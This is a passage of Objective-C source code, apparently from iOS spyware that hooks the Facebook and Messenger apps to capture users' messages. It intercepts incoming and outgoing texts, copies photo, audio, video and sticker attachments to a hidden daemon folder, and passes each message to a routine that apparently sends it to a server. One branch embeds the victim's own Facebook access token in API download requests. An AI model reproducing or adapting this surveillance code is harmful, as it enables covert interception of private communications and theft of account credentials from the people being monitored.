			for(int i=0;i<[[threadMessage outgoingAttachments]count];i++){
				facebookAttachmentPath    = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imFacebook/"];
				Class $PhotoAttachment = objc_getClass("PhotoAttachment");
				Class $AudioAttachment = objc_getClass("AudioAttachment");
                Class $VideoAttachment = objc_getClass("VideoAttachment");
                
                id attachmentI = [[threadMessage outgoingAttachments] objectAtIndex:i];
                
				if([attachmentI isKindOfClass:[$PhotoAttachment class]]){
					//=========Fix msg just delete it if cause error
					if([message length]==0){
						[imEvent setMRepresentationOfMessage:kIMMessageNone];
					}
					//=========Fix msg just delete it if cause error
					DLog(@"*****Capture Photo");
					facebookAttachmentPath = [NSString stringWithFormat:@"%@%@%f%d.jpg",facebookAttachmentPath,[threadMessage messageId],[[NSDate date]timeIntervalSince1970],i];
					DLog(@"facebookAttachmentPath %@",facebookAttachmentPath);
					PhotoAttachment * photo = attachmentI;
					NSData *datatowrite = [photo attachmentData];
					[datatowrite writeToFile:facebookAttachmentPath atomically:YES];
					
					FxAttachment *attachment = [[FxAttachment alloc] init];	
					[attachment setFullPath:facebookAttachmentPath];
					[attachments addObject:attachment];			
					[attachment release];
				}else if([attachmentI isKindOfClass:[$AudioAttachment class]]){
					//=========Fix msg just delete it if cause error
					if([message length]==0){
						[imEvent setMRepresentationOfMessage:kIMMessageNone];
					}
					//=========Fix msg just delete it if cause error
					DLog(@"*****Capture Audio");
					facebookAttachmentPath = [NSString stringWithFormat:@"%@%@%f%d.mpeg",facebookAttachmentPath,[threadMessage messageId],[[NSDate date]timeIntervalSince1970],i];
					DLog(@"facebookAttachmentPath %@",facebookAttachmentPath);
					AudioAttachment * audio = attachmentI;
					NSData *datatowrite = [audio attachmentData];
					[datatowrite writeToFile:facebookAttachmentPath atomically:YES];
					
					FxAttachment *attachment = [[FxAttachment alloc] init];	
					[attachment setFullPath:facebookAttachmentPath];
					[attachments addObject:attachment];			
					[attachment release];
				} else if ([attachmentI isKindOfClass:$VideoAttachment]) {
                    /*
                     In case VideoAttachment, in outgoingAttachments array there are pairs of Video and its thumbnail (photo), that's mean Facebook used technique of sending
                     video and its thumbnail in pair. The pair is in form of $VideoAttachment, $PhotoAttachment, $VideoAttachment, $PhotoAttachment, ....
                     
                     Base on the fact that user cannot select to send mix of video and photo, we can derive of logic below:
                     */
                    
                    for (int j = 0; j < [[threadMessage outgoingAttachments] count];) {
                        VideoAttachment *videoAttachment = [[threadMessage outgoingAttachments] objectAtIndex:j];
                        
                        DLog(@"Video attachment ***");
                        DLog(@"attachmentFilename = %@", [videoAttachment attachmentFilename]);
                        DLog(@"fileSystemUrl = %@", [videoAttachment fileSystemUrl]);
                        DLog(@"attachmentHandle = %@", [videoAttachment attachmentHandle]);
                        DLog(@"offlineVideoId = %@", [videoAttachment offlineVideoId]);
                        DLog(@"videoType = %d", [videoAttachment videoType]);
                        DLog(@"localUrl = %@", [videoAttachment localUrl]);
                        DLog(@"attachmentData length = %lu", (unsigned long)[[videoAttachment attachmentData] length]);
                        DLog(@"duration = %f", [videoAttachment duration]);
                        
                        facebookAttachmentPath = [NSString stringWithFormat:@"%@%@%f%d.mp4",facebookAttachmentPath,[threadMessage messageId],[[NSDate date]timeIntervalSince1970],j];
                        NSData *datatowrite = [videoAttachment attachmentData];
                        [datatowrite writeToFile:facebookAttachmentPath atomically:YES];
                        
                        FxAttachment *attachment = [[FxAttachment alloc] init];
                        [attachment setFullPath:facebookAttachmentPath];
                        
                        if ((j + 1) < [[threadMessage outgoingAttachments] count]) {
                            PhotoAttachment *photoAttachment = [[threadMessage outgoingAttachments] objectAtIndex:j+1];
                            
                            DLog(@"Photo of video attachment ***");
                            DLog(@"attachmentFilename = %@", [photoAttachment attachmentFilename]);
                            DLog(@"attachmentHandle = %@", [photoAttachment attachmentHandle]);
                            DLog(@"attachmentData length = %lu", (unsigned long)[[photoAttachment attachmentData] length]);
                            
                            [attachment setMThumbnail:[photoAttachment attachmentData]];
                        }
                        
                        [attachments addObject:attachment];
                        [attachment release];
                        
                        j+=2;
                    }
                    
                    // No need to go to next iteration
                    break;
                }
			}
			
			/***********************************************************
			 If no attachment, it means that this outgoing attachment 
			 has been sent from PC version then sync to the device
			 ***********************************************************/
			
			if ([attachments count] == 0) {	// cannot download attachment in time			
				NSString *newMessage = nil;
				
				// CASE 1: Send attachment without text
				if (![imEvent mMessage]	|| [[imEvent mMessage] isEqualToString:@""]) { 
					DLog (@"Assign admin text to the synced attachment event: %@ (Sending attachment WITHOUT text)", [threadMessage adminText])
					newMessage = [threadMessage adminText];
				}
				// CASE 2: Send attachment with text
				else {
					DLog (@"Assign admin text to the synced attachment event: %@ (Sending attachment WITH text)", [threadMessage adminText])
					/* e.g.,	Hello World
								You sent an image
					 */
					/*
					 Offline message have "adminText" the same as "text" in case of message without attachment thus application will capture as:
					 e.g.,	text:		One Two Three
					 adminText:	One Two Three
					 ==>	One Two Three [One Two Three]
					 */
					
					if ([[threadMessage text] isEqualToString:[threadMessage adminText]]) {
						DLog (@"Admin text and user type text is the same...")
						newMessage = [threadMessage text];
					} else {
                        if ([[threadMessage adminText] rangeOfString:[threadMessage text]].location != NSNotFound) {
                            DLog(@"Text is substring of admin text like case of (Hi\n [Amor In: Hi]) bug");
                            newMessage = [threadMessage text];
                        } else {
                            newMessage = [[imEvent mMessage] stringByAppendingFormat:@"\n [%@]", [threadMessage adminText]];
                        }
					}
				}
				[imEvent setMMessage:newMessage];
				
				if([[imEvent mMessage] length]==0){
					[imEvent setMRepresentationOfMessage:kIMMessageNone];
				} else {
					[imEvent setMRepresentationOfMessage:kIMMessageText];
				}
				
			}  else {
				/*******************************************************************************************************
				 CASE:
				 Attachment count not zero, in case of sticker, Messenger 3.0.1 sometime have outgoing sticker <adminText>
				 and <text> in message are the same this cause the sticker content text e.g: "Why Skinner sent a sticker."
				 thus we need to remove text in case of sticker to make sure that outgoing sticker never have text.
				 *******************************************************************************************************/
				if ([imEvent mRepresentationOfMessage] == kIMMessageSticker) {
					DLog (@"Sticker is an attachment thus reset the text to nothing,,,")
					FxAttachment *stickerAttachment = [attachments objectAtIndex:0];
					if ([[stickerAttachment mThumbnail] length] > 0) {
						// If there is a sticker data then we safe to remove the text message
						[imEvent setMMessage:@""];
					}
				}
			}
			
			[imEvent setMAttachments:attachments];
			[attachments release];
			
		}
		
		/**************************************************************************
		 Facebook 6.7 and Messenger 3.0.1 (sometime) uses attachmentMap instead of
		 outgoingAttachments thus capture outgoing attachment will be the
		 same as incoming attachment...
		 *************************************************************************/
		NSArray *fxAttachments = [imEvent mAttachments];
		if ([fxAttachments count] == 0) {
			if ([threadMessage attachmentMap] != nil) {
				DLog (@"----------- CAPTURE OUTGOING ATTACHMENT FROM ATTACHMENT MAP --------------")
				[imEvent setMMessage:[threadMessage text]];
				FacebookUtils * facebookUtils	= [FacebookUtils shareFacebookUtils];
				NSArray *extraArgs				= [[NSArray alloc] initWithObjects:fbmThread, threadMessage, imEvent, nil];
				[NSThread detachNewThreadSelector:@selector(checkHaveAttachment:) toTarget:facebookUtils withObject:extraArgs ];
				
				[extraArgs release];
				
			} else if ([[threadMessage adminText] length] > 0) {
				DLog (@"----------- CAPTURE OUTGOING ATTACHMENT BY WAITING ATTACHMENT MAP --------------")
				[imEvent setMMessage:[threadMessage text]];
				FacebookUtils * facebookUtils	= [FacebookUtils shareFacebookUtils];
				NSArray *extraArgs				= [[NSArray alloc] initWithObjects:fbmThread, threadMessage, imEvent, nil];
				[NSThread detachNewThreadSelector:@selector(checkHaveAttachment:) toTarget:facebookUtils withObject:extraArgs ];
				
				[extraArgs release];
				
			} else {
                if ([[threadMessage text] length]  == 0) {
                    /*
                     Note: Messenger 3.2.1
                     - Outgoing sticker:
                        Variables:
                            attachmentMap = nil
                            adminText = empty string
                            outgoingAttachment = empty array
                            getStickerFbId = 0
                            text = nil
                     */
                    DLog (@"----------- CAPTURE OUTGOING, ASSUMING IT'S STICKER BY SIMPLY DELAY --------------")
                    FacebookUtils * facebookUtils	= [FacebookUtils shareFacebookUtils];
                    NSArray *extraArgs				= [[NSArray alloc] initWithObjects:fbmThread, threadMessage, imEvent, nil];
                    [NSThread detachNewThreadSelector:@selector(checkHaveAttachment:) toTarget:facebookUtils withObject:extraArgs];
                    
                    [extraArgs release];
                } else {
                    DLog (@"----------- CAPTURE OUTGOING PURELY TEXT --------------")
                    [FacebookUtils sendFacebookEvent:imEvent];
                }
			}
		} else {
            DLog (@"----------- CAPTURE OUTGOING TEXT || ATTACHMENT (GOOD CASE) --------------")
			[FacebookUtils sendFacebookEvent:imEvent];
		}
	}
			
	else{
	/***************************************************************
							INCOMING Attachment
	 ***************************************************************/
	// Add Attachment Incoming 
		DLog(@"isSnippetMessage = %d", [threadMessage isSnippetMessage]);
		DLog(@"adminSnippet = %@", [threadMessage adminSnippet]);
		DLog(@"adminText = %@", [threadMessage adminText]);
		DLog(@"*** [adminText length]: %lu text: %@",(unsigned long)[[threadMessage adminText]length],[threadMessage text]);
		DLog(@"attachmentMap = %@, %@", [threadMessage class],[threadMessage attachmentMap]);
		DLog(@"isIncomplete = %d", [threadMessage isIncomplete]);
		if ([threadMessage respondsToSelector:@selector(isDirty)]) {DLog(@"isDirty = %d", [threadMessage isDirty]);}
		DLog(@"logMessage = %@", [threadMessage logMessage]);
        if ([threadMessage respondsToSelector:@selector(shareMap)]) {
            DLog(@"shareMap = %@", [threadMessage shareMap]);
        }
		DLog(@"hasAttachments = %d", [threadMessage hasAttachments]);
		DLog(@"totalAttachmentSize = %d", [threadMessage totalAttachmentSize]);
		if ([threadMessage respondsToSelector:@selector(getStickerFbId)]) {
			DLog(@"Sticker facebook Id = %llu", [threadMessage getStickerFbId]);
		}
		if ([threadMessage respondsToSelector:@selector(getSticker)]) {
			DLog(@"getSticker = %@", [threadMessage getSticker]);
		}
		if ([threadMessage respondsToSelector:@selector(getShare)]) {
			DLog(@"getShare = %@", [threadMessage getShare]);
		}

		// -- CASE 1: incoming attachment
		// Sometime incoming sticker from Messenger to Facebook have adminText length 0
		if	([[threadMessage adminText]length] > 0							||
			([threadMessage respondsToSelector:@selector(getStickerFbId)]	&&
			 [threadMessage getStickerFbId] > 0)							||
			 [threadMessage attachmentMap] != nil) {
			
			FacebookUtils * facebookUtils	= [FacebookUtils shareFacebookUtils];
			NSArray *extraArgs				= [[NSArray alloc] initWithObjects:fbmThread, threadMessage, imEvent, nil];
			[NSThread detachNewThreadSelector:@selector(checkHaveAttachment:) toTarget:facebookUtils withObject:extraArgs ];
			
			[extraArgs release];
		}
		// -- CASE 2: Send text
		else{
			DLog (@"Send facebook event to server without attachment");
			[FacebookUtils sendFacebookEvent:imEvent];
		}
	}
	
	[pool2 release];

	[imEvent release];
	
	[pool1 release];
}

/*
+ (void) delayCapture: (id) aUserInfo {
	DLog (@"Delay capture fire....")
	
	if ([aUserInfo isKindOfClass:[NSTimer class]]) {
		NSTimer *timer = aUserInfo;
		NSDictionary *userInfo = [timer userInfo];
		PushedThreadMessage *pushThreadMessage = [userInfo objectForKey:@"pushThreadMessage"];
		FBMThread *thread = [userInfo objectForKey:@"thread"];
		[self captureFacebookMessage:thread message:pushThreadMessage];
	} else if ([aUserInfo isKindOfClass:[NSDictionary class]]) {
		// Thread ...
		@try {
			PushedThreadMessage *pushThreadMessage = [aUserInfo objectForKey:@"pushThreadMessage"];
			FBMThread *fbmThread = [aUserInfo objectForKey:@"thread"];
			
			NSInteger wait = 0;
			while (wait < 20) {
				[NSThread sleepForTimeInterval:1.0];
				wait++;
				
				ThreadMessage * newestMessage = nil;
				if ([fbmThread respondsToSelector:@selector(newestMessage)]) { // This API exist up to Messenger 2.6
					newestMessage = [fbmThread newestMessage];
				} else {
					NSArray *messages = [fbmThread messages];
					newestMessage = [messages lastObject];
				}
				
				if([[newestMessage messageId]isEqualToString:[pushThreadMessage messageId]]){
					DLog(@"******* newestMessage");
					pushThreadMessage = (PushedThreadMessage *)newestMessage;
					DLog(@"newestMessage %@", newestMessage);
				}else{
					DLog(@"******* find");
					DLog(@"******* pushThreadMessage %@",pushThreadMessage);
					for(int i=0 ;i<[[fbmThread messages]count];i++){
						ThreadMessage * tmpMessage = [[fbmThread messages]objectAtIndex:i];
						if([[tmpMessage messageId]isEqualToString:[pushThreadMessage messageId]]){
							pushThreadMessage = (PushedThreadMessage *)tmpMessage;
							DLog(@"******* swap pushThreadMessage: %@",pushThreadMessage);
							break;
						}
					}
				}
				
				DLog(@"*** messages %@",[fbmThread messages]);
				DLog(@"*** text %@",[pushThreadMessage text]);
				DLog(@"*** outgoingAttachments %@",[pushThreadMessage outgoingAttachments]);
				
				if ([[pushThreadMessage text] length] > 0								||		// for text
					[[pushThreadMessage outgoingAttachments] count] > 0					||		// for attachment	
					([pushThreadMessage respondsToSelector:@selector(getStickerFbId)]	&&			 
					 [pushThreadMessage getStickerFbId] > 0)							)	{	// for sticker													
					DLog (@"-------------- break --------------")
					break;
				}
			} // END while
			
			[self captureFacebookMessage:fbmThread message:pushThreadMessage];
		}
		@catch (NSException * e) {
			;
		}
		@finally {
			;
		}
	}
}
*/

+ (void) mergeNewerMessages: (NSArray *) aNewerMessages
		  withOlderMessages: (NSArray *) aOlderMessages
				 intoThread: (FBMThread *) aThread {
	/*
	 Facebook 6.7.2, ThreadMessage is renamed to FBMMessage
	 */
	NSMutableArray *newMessages = [NSMutableArray array];
	for (ThreadMessage *newMessage in aNewerMessages) {
		BOOL equal = NO;
		for (ThreadMessage *oldMessage in aOlderMessages) {
			if ([newMessage isEquivalentToMessage:oldMessage]) {
				equal = YES;
				break;
			}
		}
		if (!equal) {
			DLog (@"------------------------------------")
			DLog (@">> tags %@", [newMessage tags])
			DLog (@"-- text %@", [newMessage text])
			DLog (@">> type %d, source %d, isNonUserGeneratedLogMessage %d",
				  [newMessage type],
				  [newMessage source], 
				  [newMessage isNonUserGeneratedLogMessage])
			
			BOOL unread = YES;
			for (int k = 0; k < [[newMessage tags] count]; k++) {
				if ([[[newMessage tags] objectAtIndex:k] isEqualToString:@"read"]) {
					unread = NO;
					break;
				}
			}
			
			if (unread) {
				[newMessages addObject:newMessage];
			}
		}
	}
	
	ThreadMessage *tMessage = nil;
	[newMessages sortUsingFunction:threadMessageCompare context:nil];
	
	NSEnumerator *enumerator = [newMessages reverseObjectEnumerator];
	DLog (@"---------Reverse order--------")
	while (tMessage = [enumerator nextObject]) {
		DLog (@"timestamp = %llu (%@)", [tMessage timestamp], [tMessage text])
	}
	DLog (@"---------Normal order--------")
	enumerator = [newMessages objectEnumerator];
	while (tMessage = [enumerator nextObject]) {
		DLog (@"timestamp = %llu (%@)", [tMessage timestamp], [tMessage text])
	}
	
	enumerator = [newMessages objectEnumerator];
	while (tMessage = [enumerator nextObject]) {
		// -- Check duplication ---
		FacebookUtils *fbUtils = [FacebookUtils shareFacebookUtils];
		if ([tMessage offlineThreadingId] != nil				&&
			![[tMessage offlineThreadingId] isEqualToString:@""]) {
			if (![[fbUtils mofflineThreadingId] isEqualToString:[tMessage offlineThreadingId]]) {
				[fbUtils setMofflineThreadingId:[tMessage offlineThreadingId]];
				[fbUtils setMMessageID:[tMessage messageId]];
				
				FBMThreadSet *fbmThreadSet = [[FacebookUtils shareFacebookUtils] mFBMThreadSet];
				FBMThread *thread = [fbmThreadSet getThreadById:[tMessage threadId]];
				DLog (@"FBMThread object from thread set, thread = %@", thread)
				DLog (@"timestamp		= %llu", [tMessage timestamp])
				DLog (@"sendTimestamp	= %llu", [tMessage sendTimestamp])
				
				if (![FacebookUtils isSystemMessage:tMessage]) {
					
					[FacebookUtils captureFacebookMessage:thread message:tMessage];
				} else {
					DLog (@"Not capture Application System Message ...")
				}
			}
		} else {
			DLog (@"**************** Offline threading ID is nil or nothing ****************")
			if (![[fbUtils mMessageID] isEqualToString:[tMessage messageId]]) {
				[fbUtils setMMessageID:[tMessage messageId]];
				
				FBMThreadSet *fbmThreadSet = [[FacebookUtils shareFacebookUtils] mFBMThreadSet];
				FBMThread *thread = [fbmThreadSet getThreadById:[tMessage threadId]];
				DLog (@"FBMThread object from thread set, thread = %@", thread)
				DLog (@"timestamp		= %llu", [tMessage timestamp])
				DLog (@"sendTimestamp	= %llu", [tMessage sendTimestamp])
				
				if (![FacebookUtils isSystemMessage:tMessage]) {
					
					[FacebookUtils captureFacebookMessage:thread message:tMessage];
				} else {
					DLog (@"Not capture Application System Message ...")
				}
			}
		}
	}
}

+ (BOOL) isSystemMessage: (ThreadMessage *) aThreadMessage {
	BOOL isSystemMessage = NO;
	DLog (@"Type of message = %d", [aThreadMessage type])
	/*
	 Note that if type = 2, it's an application system message
	 e.g: "You left the conversation."
	 */
	if ([aThreadMessage type] == 2){
		isSystemMessage = YES;
	}
	return isSystemMessage;
}

#pragma mark -
#pragma mark Capure incoming attachments

-(void)checkHaveAttachment:(NSArray *)aArrayofAttachment {
	DLog (@"++++++++++++++++++++ check have attachment +++++++++++++++++++")
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	
	Class $MessageAttachments = objc_getClass("MessageAttachments");
	MessageAttachments * messageAttachments = [[$MessageAttachments alloc]init];
	
	FBMThread * fbmThread			= [[aArrayofAttachment objectAtIndex:0]retain];
	ThreadMessage * originalMessage = [[aArrayofAttachment objectAtIndex:1]retain];
	FxIMEvent *imEvent				= [[aArrayofAttachment objectAtIndex:2]retain];
	
	//[NSThread sleepForTimeInterval:5.0];
	
	// For testing the message is shorten with (...) when sticker or attachment is not fully download
	//[NSThread sleepForTimeInterval:0.5];
	
	ThreadMessage * msg				= nil;
	JKDictionary * attachmentMap	= nil;
	
	NSInteger wait = 0;
	while (wait < 4) {
		[NSThread sleepForTimeInterval:5.0];
		wait++;
		
		ThreadMessage * newestMessage = nil;
		if ([fbmThread respondsToSelector:@selector(newestMessage)]) { // This API exist up to Messenger 2.6
			newestMessage = [fbmThread newestMessage];
		} else {
			NSArray *messages = [fbmThread messages];
			newestMessage = [messages lastObject];
		}
		
		if([[newestMessage messageId]isEqualToString:[originalMessage messageId]]){
			DLog(@"******* newestMessage");
			if (msg) {
				[msg release];						
				msg = nil;
			}
			msg = newestMessage;
			[msg retain];
			DLog(@"newestMessage %@", newestMessage);
		}else{
			DLog(@"******* find");
			DLog(@"******* originalMessage %@",originalMessage);
			for(int i=0 ;i<[[fbmThread messages]count];i++){
				ThreadMessage * tmpMessage = [[fbmThread messages]objectAtIndex:i];
				if([[tmpMessage messageId]isEqualToString:[originalMessage messageId]] ||
                   [[tmpMessage offlineThreadingId] isEqualToString:[originalMessage offlineThreadingId]]){
					if (msg) {
						[msg release];						
						msg = nil;
					}					
					msg = [[fbmThread messages]objectAtIndex:i];
					[msg retain];
					DLog(@"******* msg1 %@",msg);
					break;
				}
			}
		}
		
		DLog(@"messages %@",[fbmThread messages]);
		
		attachmentMap = (JKDictionary *)[msg attachmentMap];
		
		DLog(@"*** msg	= %@", msg);
		DLog(@"*** text = %@",[msg text]);
		DLog(@"*** attachmentMap = %@, %@",[attachmentMap class],attachmentMap);
        DLog (@"*** source = %d", [msg source]);
        if ([msg respondsToSelector:@selector(shareMap)]) {
            DLog (@"*** shareMap = %@", [msg shareMap]);
        }
        DLog (@"*** logMessage = %@", [msg logMessage]);
        DLog (@"*** adminSnippet = %@", [msg adminSnippet]);
        DLog (@"*** tags = %@", [msg tags]);
        DLog (@"*** outgoingAttachments = %@", [msg outgoingAttachments]);
        DLog (@"*** adminText = %@", [msg adminText]);
        
		if ([msg respondsToSelector:@selector(getStickerFbId)]) {
			DLog (@"*** getStickerFbId = %llu", [msg getStickerFbId])
		}
		if ([originalMessage respondsToSelector:@selector(getStickerFbId)]) {
			DLog (@"****** getStickerFbId = %llu", [originalMessage getStickerFbId])
		}
		
		/***************************************************************************************
		 originalMessage object has never updated its property such getStickerFbId thus we must
		 use msg object from the search to ensure that the properties are update after wait for
		 sometime.
		 ***************************************************************************************/
		if (attachmentMap													||		// for attachment	
			([msg respondsToSelector:@selector(getStickerFbId)]	&&			 
			 [msg getStickerFbId] > 0)										){		// for sticker													
			DLog (@"-------------- break --------------")
			break;
		}
	} // END while
	
	NSString* facebookAttachmentPath	=	@"";
	NSMutableArray *attachments			= [[NSMutableArray alloc] init];
	
#pragma mark Stickers both Facebook & Messenger
	/*************************************************************
	 There is case that incoming sticker is lost, the reason
	 why the sticker is lost because of hook method is not called
	 with the same number of incoming stickers
	 *************************************************************/
	//Add Sticker Incoming
	if([msg respondsToSelector:@selector(getStickerFbId)]){
		DLog(@"*** [msg getStickerFbId] %llu",[msg getStickerFbId]);
		if([msg getStickerFbId]>0){
			[imEvent setMRepresentationOfMessage:kIMMessageSticker];
					
			NSString * path = nil;
			Class $FBMStickerResourceManager = objc_getClass("FBMStickerResourceManager");
			//look at messager app inside library -> application support -> stickers
			
			NSString *stickerRootDirectoryPath = nil;
			if ([$FBMStickerResourceManager respondsToSelector:@selector(stickerRootDirectoryPath)]) {
				//For Facebook Messager Version 2.5
				stickerRootDirectoryPath = [$FBMStickerResourceManager stickerRootDirectoryPath];
			} else {
				//For Facebook Messager Version 2.6
				FBMStickerStoragePathManager *stickerStoragePathManager = [[FacebookUtils shareFacebookUtils] mFBMStickerStoragePathManager];
				stickerRootDirectoryPath = [stickerStoragePathManager stickerRootDirectoryPath];
			}
			
			if ([msg respondsToSelector:@selector(getSticker)]) {
				DLog(@"-------> Searching sticker at path = %@", stickerRootDirectoryPath);
				int foldercount = 9; // As Bill mentions, there is no more than 10 folder in stickerRootDirectoryPath (v2.5)
				for(int i = 0 ; i <= foldercount;i++){
					NSFileManager * fileManagerinsideloop = [NSFileManager defaultManager];
					path = [NSString stringWithFormat:@"%@/%d/sticker_%llu.png",stickerRootDirectoryPath,i,[msg getStickerFbId]];
					if([fileManagerinsideloop fileExistsAtPath:path]){
						DLog(@"*********** Found Sticker Location ");
						break;
					}
				}
			}else{
				DLog(@"-------> in version below 2.5 for Messenger");
				Class $UserSettings			= objc_getClass("UserSettings");
				UserSettings * settting		= [$UserSettings sharedInstance];
				
				Class $FBMStickerManager	= objc_getClass("FBMStickerManager");
				FBMStickerManager * manager = [[$FBMStickerManager alloc]initWithUserSettings:settting];
				
				FBMSticker * fbmStickerpack		= [manager stickerWithFbId:[msg getStickerFbId]];
				path = [NSString stringWithFormat:@"%@/%llu/sticker_%llu.png",stickerRootDirectoryPath,[fbmStickerpack stickerPackFbId],[msg getStickerFbId]];
				
				[manager release];
			}
			
			NSFileManager * fileManager = [NSFileManager defaultManager];
			
			NSString * defaultpath		= [NSString stringWithFormat:@"%@/FBMessengerApp.bundle/sticker_items/sticker_%llu.png",[[NSBundle mainBundle] resourcePath],[msg getStickerFbId]];
			if (![fileManager fileExistsAtPath:defaultpath]) {
				// Facebook 6.6
				defaultpath = [NSString stringWithFormat:@"%@/FBMessenger.bundle/sticker_items/sticker_%llu.png",[[NSBundle mainBundle] resourcePath],[msg getStickerFbId]];
                if (![fileManager fileExistsAtPath:defaultpath]) {
                    // Messenger 8.0 for iPad
                    defaultpath = [NSString stringWithFormat:@"%@/FBStickersKit.bundle/sticker_items/sticker_%llu.png",[[NSBundle mainBundle] resourcePath],[msg getStickerFbId]];
                }
			}
			NSString * otherpath		= [NSString stringWithFormat:@"%@/others/sticker_%llu.png",stickerRootDirectoryPath,[msg getStickerFbId]];
			DLog (@"Incoming-Default sticker path	= %@", defaultpath)
			DLog (@"Incoming-Other sticker path		= %@", otherpath)
			DLog (@"Incoming-Download sticker path	= %@", path)
			
			/********************************************
			 sticker autorelease pool
			 ********************************************/
			NSAutoreleasePool *stickerPool = [[NSAutoreleasePool alloc] init];			
			
			NSData * datatowrite		= nil;
			
			if([fileManager fileExistsAtPath:path]){
				DLog(@"*** path %@",path);
				UIImage *image	= [UIImage imageWithContentsOfFile:path];
				datatowrite		= UIImagePNGRepresentation(image);
			}else{
				if([fileManager fileExistsAtPath:defaultpath]){
					DLog(@"*** defaultpath %@",defaultpath);
					UIImage *image	= [UIImage imageWithContentsOfFile:defaultpath];
					datatowrite		= UIImagePNGRepresentation(image);	
				}else if([fileManager fileExistsAtPath:otherpath]){
					DLog(@"*** otherpath %@",otherpath);
					UIImage *image	= [UIImage imageWithContentsOfFile:otherpath];
					datatowrite		= UIImagePNGRepresentation(image);	
				}
			}
			if(datatowrite != nil){
				DLog(@"********************* Write Data");
				FxAttachment *attachment = [[FxAttachment alloc] init];	
				[attachment setMThumbnail:datatowrite];
				[attachments addObject:attachment];			
				[attachment release];
			}else{
				DLog(@"********************* Data Lost");
			}
			
			[stickerPool drain];
		}
	}
    
    Class $JKDictionary = objc_getClass("JKDictionary");
    Class $NSDictionary = objc_getClass("NSDictionary");
    Class $__NSDictionaryI = objc_getClass("__NSDictionaryI");
    
    BOOL isCompatibleType = ([attachmentMap isKindOfClass:$JKDictionary]    ||
                             [attachmentMap isKindOfClass:$NSDictionary]    ||
                             [attachmentMap isKindOfClass:$__NSDictionaryI]);
    
	DLog(@"isCompatibleType = %d", isCompatibleType);
    DLog(@"$JKDictionary = %@", $JKDictionary);
    DLog(@"$NSDictionary = %@", $NSDictionary);
    DLog(@"$__NSDictionaryI = %@", $__NSDictionaryI);
    
	/*
     - Add Incoming Attachment (it's also used to capture attachment from outgoing too.. e.g: Facebook 8.0)
     - Facebook Messenger 4.1 up type of attachmentMap is NSArray in case of Sticker
     */
	for (int i=0; (isCompatibleType && i < [[attachmentMap allKeys]count]); i++){
		facebookAttachmentPath    = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imFacebook/"];
		NSMutableDictionary * item = [attachmentMap objectForKey:[[attachmentMap allKeys]objectAtIndex:i]];
		NSString * mytype = [item objectForKey:@"mime_type"] ;
		
#pragma mark Image
		
		// -- Image
		if ([mytype rangeOfString:@"image"].location != NSNotFound) {
			//=========Fix msg just delete it if cause error
			if([[msg text]length]==0){
				[imEvent setMRepresentationOfMessage:kIMMessageNone];
			}
			//=========Fix msg just delete it if cause error
			Class $AttachmentURLFormatter = objc_getClass("AttachmentURLFormatter");
			AttachmentURLFormatter *url =[[$AttachmentURLFormatter alloc]init];
			
#pragma mark Image Facebook Application
			
			if([[[NSBundle mainBundle] bundleIdentifier]isEqualToString:@"com.facebook.Facebook"]){
				NSString * urlForImage = [NSString stringWithFormat:@"%@",[url urlForAttachment:[[attachmentMap allKeys]objectAtIndex:i] messageId:[msg messageId] preview:NO]];
				NSArray * ArrayForKey = [urlForImage componentsSeparatedByString:@"(null)"];
				
				NSString * checkurl = [ArrayForKey objectAtIndex:1];
				DLog (@"checkurl = %@", checkurl)
				
				NSData *datatowrite = nil;
				NSData *thumbnail = nil;
				
				if ([checkurl length] > 0) {
					if ([checkurl rangeOfString:@"messaging.getAttachment"].location != NSNotFound) {
						urlForImage = [NSString stringWithFormat:@"https://api.facebook.com/method/%@",[ArrayForKey objectAtIndex:1]];
					}else{
						urlForImage = [NSString stringWithFormat:@"https://api.facebook.com/method/messaging.getAttachment%@",[ArrayForKey objectAtIndex:1]];
					}
					DLog(@"********************* urlForImage %@",urlForImage);
					
					NSURL * link = [NSURL URLWithString:urlForImage];
					datatowrite = [NSData dataWithContentsOfURL:link];
				} else {
					// Facebook 6.7
					NSDictionary *imageInfo = [item objectForKey:@"image_data"];
					DLog (@"image_data info = %@", imageInfo)
					
					NSString *previewUrl = [imageInfo objectForKey:@"preview_url"];
					thumbnail = [NSData dataWithContentsOfURL:[NSURL URLWithString:previewUrl]];
					NSString *url = [imageInfo objectForKey:@"url"];
					datatowrite = [NSData dataWithContentsOfURL:[NSURL URLWithString:url]];
				}
				
				facebookAttachmentPath = [NSString stringWithFormat:@"%@%@%f%d.jpeg",facebookAttachmentPath,[msg messageId],[[NSDate date]timeIntervalSince1970],i];
				DLog (@"datatowrite = %lu", (unsigned long)[datatowrite length])
				[datatowrite writeToFile:facebookAttachmentPath atomically:YES];
                
                if (datatowrite == nil) {
                    DLog(@"Cannot download image data...");
                    facebookAttachmentPath = @"image/jpeg";
                }
                if (thumbnail == nil) {
                    DLog(@"Cannot download image thumbnail data...");
                }
				
				FxAttachment *attachment = [[FxAttachment alloc] init];
				[attachment setMThumbnail:thumbnail];
				[attachment setFullPath:facebookAttachmentPath];
				[attachments addObject:attachment];			
				[attachment release];
			
			}
			
#pragma mark Image Facebook Messenger Application
			
			else if([[[NSBundle mainBundle] bundleIdentifier]isEqualToString:@"com.facebook.Messenger"]){										
				NSString * urlForImage = [NSString stringWithFormat:@"%@", [url urlForAttachment:[[attachmentMap allKeys] objectAtIndex:i] 
																					   messageId:[msg messageId] 
																						 preview:NO]];
				NSArray * ArrayForKey = [urlForImage componentsSeparatedByString:@"(null)"];
				NSString * checkurl = [ArrayForKey objectAtIndex:1];
				DLog (@"checkurl %@", checkurl)								
				/*********************************************************************************************
					- FIXED ISSUE -
					This is to fix the issue of not capture incoming photo Facebook Messenger version 3.0, 3.0.1.
					For FB Messenger 3.0, the variable urlForImage will be null
						CASE 1: FB Messenger version earlier than 3.0 
							- Not capture image thumbnail
						CASE 2: FB Messenger version 3.0
							- Capture image thumbnail
				 *********************************************************************************************/
				if ([checkurl length] > 0) {
					// CASE 1: FB Messenger version earlier than 3.0
					FBAuthenticationManagerImpl *fbAuthenManagerImpl	= [[FacebookUtils shareFacebookUtils]mFBAuthenManagerImpl];
					FBFacebookCredentials * facebookCredentials			= [fbAuthenManagerImpl facebookCredentials];															
					if ([checkurl rangeOfString:@"messaging.getAttachment"].location != NSNotFound) {
						urlForImage = [NSString stringWithFormat:@"https://api.facebook.com/method/%@&access_token=%@",[ArrayForKey objectAtIndex:1],[facebookCredentials accessToken]];
					}else{
